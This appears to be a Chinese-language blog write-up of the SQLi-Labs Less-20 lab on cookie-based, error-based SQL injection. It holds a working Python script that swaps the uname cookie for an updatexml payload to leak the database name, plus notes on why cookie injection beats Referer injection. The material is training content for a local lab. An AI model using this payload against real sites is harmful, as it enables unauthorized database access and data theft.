SQLi-Labs Less-20

2026年9月28日 SQLi-Labs Web安全 SQL注入 Cookie注入

一、题目信息

  • 题目名称：SQLi-Labs Less-20 (POST - Cookie injections - Uagent field - error based)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / Cookie 注入 / 报错注入
  • 靶场链接：http://localhost:8081/Less-20/（本地环境）
  • 涉及工具：Python (requests库)

二、解题步骤

1. 分析题目考什么

本题的核心考点是Cookie 中的 uname 字段注入。后端在用户登录成功后，会将用户名写入 Cookie。后续页面在读取 Cookie 时，没有进行过滤，直接将其拼接到 SELECT 查询语句中，导致报错注入。

2. 怎么想（破题思路）

  • 先正常登录，获取服务器返回的 Cookie（包含 uname 字段）。
  • 使用 Python 脚本修改 Cookie 中的 uname 值为注入 Payload。
  • 由于 Less-20 是 SELECT 查询，并不像 Less-19 那样受到 HTTP 头部空格截断的困扰。
  • Payload 末尾使用 -- - 保证注释符有效，成功触发 updatexml 报错。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Less-19 与 Less-20 的环境差异

踩坑情况：在 Less-19（Referer 注入）中，同样的 Payload 怎么都不成功，但在 Less-20（Cookie 注入）中却一次跑通。

原因分析：HTTP 协议中，Referer 头部极其敏感，尾部的空格和特殊字符容易被 Python 的 `requests` 库或 PHP 后端自动裁剪。而 Cookie 的传输机制不同，它会原样保留 Payload 中的空格和闭合符。

改进方式：在面对头部注入时，优先测试 Cookie，其次测试 User-Agent，最后再测试 Referer。

详细实操步骤（Payload逐字解释）

第一步：编写 Python 脚本

import requests
import re

url = "http://localhost:8081/Less-20/"

# 1. 正常登录获取 Cookie
session = requests.Session()
data = {"uname": "admin", "passwd": "admin", "submit": "Submit"}
r_login = session.post(url, data=data)

# 2. 修改 Cookie 中的 uname 为 Payload
payload = "' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -"
cookies = session.cookies.get_dict()
cookies['uname'] = payload

# 3. 带着注入 Cookie 发送请求
r = session.get(url, cookies=cookies)

# 4. 提取报错
match = re.search(r"XPATH syntax error: '(.*?)'", r.text)
if match:
    print(f"\n[+] 注入成功！数据库名为: {match.group(1)}")

逐字解析：

  • session.cookies.get_dict()：获取登录后的 Cookie 字典。
  • cookies['uname'] = payload：将注入 Payload 赋值给 uname 字段，这是核心漏洞点。
  • -- -：注释符。中间的 - 是为了防止尾部空格被吞。

第二步：验证

运行脚本后，终端输出 [+] 注入成功！数据库名为: ~security~，证明注入成功。

4. 怎么迁移（跨领域联想）

  • Cookie 安全：Cookie 是用户完全可控的输入源。开发者常犯的错误是只检查 GET/POST 参数，却忘记过滤 Cookie。这与 XSS 的存储型攻击类似，都是通过隐蔽通道注入。
  • HTTP 头部差异：不同头部字段（Referer、UA、Cookie）在传输和解析时的行为各不相同。理解 HTTP 协议细节，能帮助渗透测试人员快速定位可利用的注入点。
  • 环境适配策略：遇到 MySQL 8 等高版本环境时，不能死磕 updatexml 报错。如果没有报错回显，应立刻切换到布尔盲注或时间盲注（如 Less-19 的教训）。

三、名词大全与原理深度复盘

1. Cookie 注入

指后端将 Cookie 中的某个字段（如 uname）取出，不做过滤直接拼接到 SQL 语句中，从而导致注入漏洞。攻击者通过修改本地 Cookie 来注入恶意 Payload。

2. HTTP 头部解析差异

Referer、User-Agent 等头部字段通常被视为文本，尾部的空格和特殊符号容易被清洗。而 Cookie 以键值对形式传输，能够保留更复杂的 Payload 结构，这是 Less-20 比 Less-19 更容易成功的原因。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-19 的区别：Less-19 注入 Referer，Less-20 注入 Cookie。两者的触发机制完全不同，Less-20 的成功率远高于 Less-19。

2. 这种题目的出现原因（为什么存在）

开发者为了记住用户登录状态，把用户名写进 Cookie。在后续读取时，认为 Cookie 是“自己写的”，所以不会有安全问题，却忽略了 Cookie 属于客户端可控数据。

3. 这种应用在实际中如何体现？

在实战中，如果遇到一个 PHP 网站使用了 Cookie 记录用户信息，可以优先测试 SQL 注入。防御方应对 Cookie 值进行严格过滤，并开启 HttpOnly 属性。

4. 如何抽象理解概念（大白话）

把靶场比作一个“门卫”：

  • Less-20 的门卫只看你手里的“会员卡”（Cookie）。
  • 你把会员卡上的名字改成了“炸弹”。
  • 门卫拿着会员卡去系统里查询（SELECT），系统一读会员卡上的名字，直接崩了（报错注入）。
  • 这就是 Cookie 注入的生动写照。
